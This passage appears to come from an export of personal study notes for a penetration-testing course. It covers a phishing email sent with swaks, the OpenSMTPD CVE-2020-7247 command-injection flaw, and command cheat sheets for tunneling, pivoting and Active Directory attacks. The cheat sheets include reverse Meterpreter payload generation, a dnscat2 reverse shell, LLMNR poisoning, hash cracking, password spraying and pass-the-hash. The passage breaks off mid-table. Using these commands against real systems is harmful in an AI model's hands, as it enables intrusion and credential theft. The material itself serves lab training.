FROM:<notifications@inlanefreight.com>\n<-  250 OK\n -> RCPT TO:<employees@inlanefreight.com>\n<-  250 OK\n -> DATA\n<-  354 End data with <CR><LF>.<CR><LF>\n -> Date: Thu, 29 Oct 2020 01:36:06 -0400\n -> To: employees@inlanefreight.com\n -> From: notifications@inlanefreight.com\n -> Subject: Company Notification\n -> Message-Id: <20201029013606.775675@parrot>\n -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/\n -> \n -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/\n -> \n -> \n -> .\n<-  250 OK\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/16- Latest Email Service Vulnerabilities",
    "path": "02_CPTS/10-Attacking Common Services/16- Latest Email Service Vulnerabilities.md",
    "title": "16  Latest Email Service Vulnerabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- One of the most recent publicly disclosed and dangerous Simple Mail Transfer Protocol (SMTP) vulnerabilities was discovered in OpenSMTPD up to version 6.6.2 service was in 2020. This vulnerability...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nOne of the most recent publicly disclosed and dangerous [Simple Mail Transfer Protocol (SMTP)](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) vulnerabilities was discovered in [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2 service was in 2020. This vulnerability was assigned [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) and leads to RCE. It has been exploitable since 2018. This service has been used in many different Linux distributions, such as Debian, Fedora, FreeBSD, and others. The dangerous thing about this vulnerability is the possibility of executing system commands remotely on the system and that exploiting this vulnerability does not require authentication.\n\nAccording to [Shodan.io](https://www.shodan.io), at the time of writing (April 2022), there are over 5,000 publicly accessible OpenSMTPD servers worldwide, and the trend is growing. However, this does not mean that this vulnerability affects every service. Instead, we want to show you how significant the impact of an RCE would be in case this vulnerability were discovered now. However, of course, this applies to all other services as well.\n\n#### Shodan Search\n\n![Shodan report for OpenSMTPD showing a world map with highlighted countries. Total: 5,290. Top countries: United States (1,305), Germany (1,187), France (553), Netherlands (536), United Kingdom (258).](https://academy.hackthebox.com/storage/modules/116/opensmtpd.png)\n\n#### Shodan Trend\n\n![Shodan trends graph for OpenSMTPD showing growth over time. Data points: 24 months ago 4,061, 12 months ago 4,853, 6 months ago 5,297, 3 months ago 5,382, 1 month ago 5,349, March 2022 5,640.](https://academy.hackthebox.com/storage/modules/116/opensmtpd_trend.png)\n\n---\n\n## The Concept of the Attack\n\nAs we already know, with the SMTP service, we can compose emails and send them to desired people. The vulnerability in this service lies in the program's code, namely in the function that records the sender's email address. This offers the possibility of escaping the function using a semicolon (`;`) and making the system execute arbitrary shell commands. However, there is a limit of 64 characters, which can be inserted as a command. The technical details of this vulnerability can be found [here](https://www.openwall.com/lists/oss-security/2020/01/28/3).\n\n#### The Concept of Attacks\n\n![Flowchart with stages: Source (Code, Libraries, Config, APIs, User Input), Processes (PID, Input, Data processing, Variables, Logging), Privileges (System, User, Groups, Policies, Rules), Destination (Local: Files, Process; Network: Interface, Network Address, Route).](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)\n\nHere we need to initialize a connection with the SMTP service first. This can be automated by a script or entered manually. After the connection is established, an email must be composed in which we define the sender, the recipient, and the actual message for the recipient. The desired system command is inserted in the sender field connected to the sender address with a semicolon (`;`). As soon as we finish writing, the data entered is processed by the OpenSMTPD process.\n\n#### Initiation of the Attack\n\n|**Step**|**Remote Code Execution**|**Concept of Attacks - Category**|\n|---|---|---|\n|`1.`|The source is the user input that can be entered manually or automated during direct interaction with the service.|`Source`|\n|`2.`|The service will take the email with the required information.|`Process`|\n|`3.`|Listening to the standardized ports of a system requires `root` privileges on the system, and if these ports are used, the service runs accordingly with elevated privileges.|`Privileges`|\n|`4.`|As the destination, the entered information is forwarded to another local process.|`Destination`|\n\nThis is when the cycle starts all over again, but this time to gain remote access to the target system.\n\n#### Trigger Remote Code Execution\n\n|**Step**|**Remote Code Execution**|**Concept of Attacks - Category**|\n|---|---|---|\n|`5.`|This time, the source is the entire input, especially from the sender area, which contains our system command.|`Source`|\n|`6.`|The process reads all the information, and the semicolon (`;`) interrupts the reading due to special rules in the source code that leads to the execution of the entered system command.|`Process`|\n|`7.`|Since the service is already running with elevated privileges, other processes of OpenSMTPD will be executed with the same privileges. With these, the system command we entered will also be executed.|`Privileges`|\n|`8.`|The destination for the system command can be, for example, the network back to our host through which we get access to the system.|`Destination`|\n\nAn [exploit](https://www.exploit-db.com/exploits/47984) has been published on the [Exploit-DB](https://www.exploit-db.com) platform for this vulnerability which can be used for more detailed analysis and the functionality of the trigger for the execution of system commands.\n\n---\n\n## Next Steps\n\nAs we've seen, email attacks can lead to sensitive data disclosure through direct access to a user's inbox or by combining a misconfiguration with a convincing phishing email. There are other ways to attack email services that can be very effective as well. A few Hack The Box boxes demonstrate email attacks, such as [Rabbit](https://www.youtube.com/watch?v=5nnJq_IWJog), which deals with brute-forcing Outlook Web Access (OWA) and then sending a document with a malicious macro to phish a user, [SneakyMailer](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html) which has elements of phishing and enumerating a user's inbox using Netcat and an IMAP client, and [Reel](https://0xdf.gitlab.io/2018/11/10/htb-reel.html) which dealt with brute-forcing SMTP users and phishing with a malicious RTF file.\n\nIt's worth playing these boxes, or at least watching the Ippsec video or reading a walkthrough to see examples of these attacks in action. This goes for any attack demonstrated in this module (or others). The site [ippsec.rocks](https://ippsec.rocks/?#) can be used to search for common terms and will show which HTB boxes these appear in, which will reveal a wealth of targets to practice against.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/11-Pivoting, Tunneling, and Port Forwarding/01- Cheet Sheet Tunneling",
    "path": "02_CPTS/11-Pivoting, Tunneling, and Port Forwarding/01- Cheet Sheet Tunneling.md",
    "title": "01  Cheet Sheet Tunneling",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "| Command                                                                                                                                                                                               ...",
    "category": "02_CPTS",
    "content": "| Command                                                                                                                                                                                                            | Description                                                                                                                                                                                                                                                             |     |\n| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |\n| `ifconfig`                                                                                                                                                                                                         | Linux-based command that displays all current network configurations of a system.                                                                                                                                                                                       |     |\n| `ipconfig`                                                                                                                                                                                                         | Windows-based command that displays all system network configurations.                                                                                                                                                                                                  |     |\n| `netstat -r`                                                                                                                                                                                                       | Command used to display the routing table for all IPv4-based protocols.                                                                                                                                                                                                 |     |\n| `nmap -sT -p22,3306 <IPaddressofTarget>`                                                                                                                                                                           | Nmap command used to scan a target for open ports allowing SSH or MySQL connections.                                                                                                                                                                                    |     |\n| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`                                                                                                                                                            | SSH comand used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306.                                                                                                                                                   |     |\n| `netstat -antp \\| grep 1234`                                                                                                                                                                                       | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` .                                                                                                                                |     |\n| `nmap -v -sV -p1234 localhost`                                                                                                                                                                                     | Nmap command used to scan a host through a connection that has been made on local port `1234`.                                                                                                                                                                          |     |\n| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`                                                                                                                                          | SSH command that instructs the ssh client to request the SSH server forward all data via port `1234` to `localhost:3306`.                                                                                                                                               |     |\n| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                           | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.                                                                                                              |     |\n| `tail -4 /etc/proxychains.conf`                                                                                                                                                                                    | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.                                                                                                                                 |     |\n| `proxychains nmap -v -sn 172.16.5.1-200`                                                                                                                                                                           | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`).                                          |     |\n| `proxychains nmap -v -Pn -sT 172.16.5.19`                                                                                                                                                                          | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`).                                  |     |\n| `proxychains msfconsole`                                                                                                                                                                                           | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.                                                                                                                                                                       |     |\n| `msf6 > search rdp_scanner`                                                                                                                                                                                        | Metasploit search that attempts to find a module called `rdp_scanner`.                                                                                                                                                                                                  |     |\n| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`                                                                                                                                                | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.                                                                                                                                     |     |\n| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`                                                                                            | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following `lhost=` on local port 8080 (`LPORT=8080`). Payload will take the form of an executable file called `backupscript.exe`.    |     |\n| `msf6 > use exploit/multi/handler`                                                                                                                                                                                 | Used to select the multi-handler exploit module in Metasploit.                                                                                                                                                                                                          |     |\n| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`                                                                                                                                                               | Uses secure copy protocol (`scp`) to transfer the file `backupscript.exe` to the specified host and places it in the Ubuntu user's home directory (`:~/`).                                                                                                              |     |\n| `python3 -m http.server 8123`                                                                                                                                                                                      | Uses Python3 to start a simple HTTP server listening on port `8123`. Can be used to retrieve files from a host.                                                                                                                                                         |     |\n| `Invoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"`                                                                                                                | PowerShell command used to download a file called backupscript.exe from a webserver (`172.16.5.129:8123`) and then save the file to location specified after `-OutFile`.                                                                                                |     |\n| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN`                                                                                                                                    | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target.                                                                                                     |     |\n| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080`                                                                                                        | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob.                                               |     |\n| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`                                                                                                                                                      | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`).                                                                                                                                                        |     |\n|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                         |     |\n| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \\| grep \"bytes from\" &) ;done`                                                                                                                                       | For Loop used on a Linux-based system to discover devices in a specified network segment.                                                                                                                                                                               |     |\n| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \\| find \"Reply\"`                                                                                                                                           | For Loop used on a Windows-based system to discover devices in a specified network segment.                                                                                                                                                                             |     |\n| `1..254 \\| % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}`                                                                                                                          | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.                                                                                                                                                                                   |     |\n| `msf6 > use auxiliary/server/socks_proxy`                                                                                                                                                                          | Metasploit command that selects the `socks_proxy` auxiliary module.                                                                                                                                                                                                     |     |\n| `msf6 auxiliary(server/socks_proxy) > jobs`                                                                                                                                                                        | Metasploit command that lists all currently running jobs.                                                                                                                                                                                                               |     |\n| `socks4 127.0.0.1 9050`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |     |\n| `Socks5 127.0.0.1 1080`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |     |\n| `msf6 > use post/multi/manage/autoroute`                                                                                                                                                                           | Metasploit command used to select the autoroute module.                                                                                                                                                                                                                 |     |\n|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                         |     |\n| `meterpreter > help portfwd`                                                                                                                                                                                       | Meterpreter command used to display the features of the portfwd command.                                                                                                                                                                                                |     |\n| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`                                                                                                                                                 | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.                                                                |     |\n| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`                                                                                                                                                                 | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.                                                                                                          |     |\n| `netstat -antp`                                                                                                                                                                                                    | Used to display all (`-a`) active network connections with associated process IDs. `-t` displays only TCP connections.`-n` displays only numerical addresses. `-p` displays process IDs associated with each displayed connection.                                      |     |\n| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>`                                                                                                                                          | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port `1234` listening on the IP address of the Attack Host.                                                                                            |     |\n| `meterpreter > bg`                                                                                                                                                                                                 | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux                                                                                                                                       |     |\n| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`                                                                                                                                                      | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.                                                                                                                                 |     |\n| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`                                                                                                                                                        | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.                                                                                                                               |     |\n| `plink -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                         | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |     |\n| `sudo apt-get install sshuttle`                                                                                                                                                                                    | Uses apt-get to install the tool sshuttle.                                                                                                                                                                                                                              |     |\n| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`                                                                                                                                                              | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`).                                                                                     |     |\n| `sudo git clone https://github.com/klsecservices/rpivot.git`                                                                                                                                                       | Clones the rpivot project GitHub repository.                                                                                                                                                                                                                            |     |\n| `sudo apt-get install python2.7`                                                                                                                                                                                   | Uses apt-get to install python2.7.                                                                                                                                                                                                                                      |     |\n| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`                                                                                                                                     | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`).                                                                                                                                       |     |\n| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                                                                                                                                                                         | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.                                                                                                                                                                |     |\n| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`                                                                                                                                                   | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port.                                                                                                                                                          |     |\n| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`                                                                                                                                                          | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.                                                                                                                                          |     |\n| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.                                                                                                                                                              |     |\n| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`                                                                                 | Windows-based command that uses `netsh.exe` to configure a portproxy rule called `v4tov4` that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.                                                                               |     |\n| `netsh.exe interface portproxy show v4tov4`                                                                                                                                                                        | Windows-based command used to view the configurations of a portproxy rule called v4tov4.                                                                                                                                                                                |     |\n| `git clone https://github.com/iagox86/dnscat2.git`                                                                                                                                                                 | Clones the `dnscat2` project GitHub repository.                                                                                                                                                                                                                         |     |\n| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`                                                                                                                        | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled.                                                                                                         |     |\n| `git clone https://github.com/lukebaggett/dnscat2-powershell.git`                                                                                                                                                  | Clones the dnscat2-powershell project Github repository.                                                                                                                                                                                                                |     |\n| `Import-Module dnscat2.ps1`                                                                                                                                                                                        | PowerShell command used to import the dnscat2.ps1 tool.                                                                                                                                                                                                                 |     |\n| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`                                                                                     | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`).                                                                        |     |\n| `dnscat2> ?`                                                                                                                                                                                                       | Used to list dnscat2 options.                                                                                                                                                                                                                                           |     |\n| `dnscat2> window -i 1`                                                                                                                                                                                             | Used to interact with an established dnscat2 session.                                                                                                                                                                                                                   |     |\n| `./chisel server -v -p 1234 --socks5`                                                                                                                                                                              | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5.                                                                                                                                                                           |     |\n| `./chisel client -v 10.129.202.64:1234 socks`                                                                                                                                                                      | Used to connect to a chisel server at the specified IP address & port using socks.                                                                                                                                                                                      |     |\n| `git clone https://github.com/utoni/ptunnel-ng.git`                                                                                                                                                                | Clones the ptunnel-ng project GitHub repository.                                                                                                                                                                                                                        |     |\n| `sudo ./autogen.sh`                                                                                                                                                                                                | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.                                                                                                                                                                                 |     |\n| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                                                                                                                                                                           | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`).                                                                                                                                                                 |     |\n| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`                                                                                                                                                    | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`).                                                                                                                                                                                    |     |\n| `ssh -p2222 -lubuntu 127.0.0.1`                                                                                                                                                                                    | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.                                                                                                                                       |     |\n| `regsvr32.exe SocksOverRDP-Plugin.dll`                                                                                                                                                                             | Windows-based command used to register the SocksOverRDP-PLugin.dll.                                                                                                                                                                                                     |     |\n| `netstat -antb \\|findstr 1080`                                                                                                                                                                                     | Windows-based command used to list TCP network connections listening on port 1080.                                                                                                                                                                                      |     |\n| Ligolo-ng                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                         |     |\n",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/01-Cheet Sheet AD Enumeration & Attacks",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/01-Cheet Sheet AD Enumeration & Attacks.md",
    "title": "01 Cheet Sheet AD Enumeration & Attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Initial Enumeration | Command                                                                               | Description                                                                               ...",
    "category": "02_CPTS",
    "content": "# Initial Enumeration\n\n| Command                                                                               | Description                                                                                                                                                                                                                                                                                                 |\n| ------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `nslookup ns1.inlanefreight.com`                                                      | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.                                                                                                                                                                      |\n| `sudo tcpdump -i ens224`                                                              | Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host.                                                                                                                                                                                             |\n| `sudo responder -I ens224 -A`                                                         | Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the `-I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host                                                                |\n| `fping -asgq 172.16.5.0/23`                                                           | Performs a ping sweep on the specified network segment from a Linux-based host.                                                                                                                                                                                                                             |\n| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`                    | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host |\n| `sudo git clone https://github.com/ropnop/kerbrute.git`                               | Uses `git` to clone the kerbrute tool from a Linux-based host.                                                                                                                                                                                                                                              |\n| `make help`                                                                           | Used to list compiling options that are possible with `make` from a Linux-based host.                                                                                                                                                                                                                       |\n| `sudo make all`                                                                       | Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures.                                                                                                                                                                                                                        |\n| `./kerbrute_linux_amd64`                                                              | Used to test the chosen complied `Kebrute` binary from a Linux-based host.                                                                                                                                                                                                                                  |\n| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`                                | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.                                                                                                                                                                                |\n| `kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host.             |\n\n# LLMNR/NTB-NS Poisoning\n\n| Command                                                                                                                                                                                                       | Description                                                                                                                                                              |\n| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| `responder -h`                                                                                                                                                                                                | Used to display the usage instructions and various options available in `Responder` from a Linux-based host.                                                             |\n| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`                                                                                                                                              | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |\n| `Import-Module .\\Inveigh.ps1`                                                                                                                                                                                 | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`.                                                                             |\n| `(Get-Command Invoke-Inveigh).Parameters`                                                                                                                                                                     | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host.                                                  |\n| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`                                                                                                                                                     | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file.                                                           |\n| `.\\Inveigh.exe`                                                                                                                                                                                               | Starts the `C#` implementation of `Inveigh` from a Windows-based host.                                                                                                   |\n| `$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\" Get-ChildItem $regkey \\|foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.                                                                                                              |\n\n# Password Spraying & Password Policies\n\n| Command                                                                                                                                                    | Description                                                                                                                                                                                                                                          |\n| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done`                                                       | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host.                                                                                                                                                    |\n| `nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`                                                                                        | Uses `nxc`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host.                                                                                                           |\n| `rpcclient -U \"\" -N 172.16.5.5`                                                                                                                            | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host.                                                                                                                            |\n| `rpcclient $> querydominfo`                                                                                                                                | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host.                                                                                                                                                |\n| `enum4linux -P 172.16.5.5`                                                                                                                                 | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host.                                                                                                                                        |\n| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                                                                                                                | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option.                                                |\n| `ldapsearch -H ldap://172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" \\| grep -m 1 -B 10 pwdHistoryLength`                                         | Uses `ldapsearch` to enumerate the password policy in a target Windows domain from a Linux-based host.                                                                                                                                               |\n| `net accounts`                                                                                                                                             | Used to enumerate the password policy in a Windows domain from a Windows-based host.                                                                                                                                                                 |\n| `Import-Module .\\PowerView.ps1`                                                                                                                            | Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host.                                                                                                                                                         |\n| `Get-DomainPolicy`                                                                                                                                         | Used to enumerate the password policy in a target Windows domain from a Windows-based host.                                                                                                                                                          |\n| `enum4linux -U 172.16.5.5 \\| grep \"user:\" \\| cut -f2 -d\"[\" \\| cut -f1 -d\"]\"`                                                                               | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host.                                                                                 |\n| `rpcclient -U \"\" -N 172.16.5.5 rpcclient $> enumdomuser`                                                                                                   | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.                                                                                                                                                         |\n| `nxc smb 172.16.5.5 --users`                                                                                                                      | Uses `nxc` to discover users (`--users`) in a target Windows domain from a Linux-based host.                                                                                                                                                |\n| `ldapsearch -H ldap://172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&(objectclass=user))\" sAMAccountName \\| grep sAMAccountName: \\| cut -f2 -d\" \"` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host.                                                                                       |\n| `./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U`                                                                                                            | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host.                                                                                                                                         |\n| `for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 \\| grep Authority; done`                                   | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner.                                         |\n| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`                                                                   | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host.                                                                                               |\n| `sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 \\| grep +`                                                                             | Uses `nxc` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`.                                          |\n| `sudo nxc smb 172.16.5.5 -u avazquez -p Password123`                                                                                              | Uses `nxc` to validate a set of credentials from a Linux-based host.                                                                                                                                                                        |\n| `sudo nxc smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \\| grep +`                                          | Uses `nxc` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |\n| `Import-Module .\\DomainPasswordSpray.ps1`                                                                                                                  | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host.                                                                                                                                                        |\n| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`                                                       | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host.                                                                                                              |\n\n# Enumerating Security Controls\n\n|Command|Description|\n|---|---|\n|`Get-MpComputerStatus`|PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host.|\n|`Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections`|PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host.|\n|`$ExecutionContext.SessionState.LanguageMode`|PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host.|\n|`Find-LAPSDelegatedGroups`|A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host.|\n|`Find-AdmPwdExtendedRights`|A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host.|\n|`Get-LAPSComputers`|A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.|\n\n# Credentialed Enumeration\n\n|Command|Description|\n|---|---|\n|`xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`|Connects to a Windows target using valid credentials. Performed from a Linux-based host.|\n|`sudo 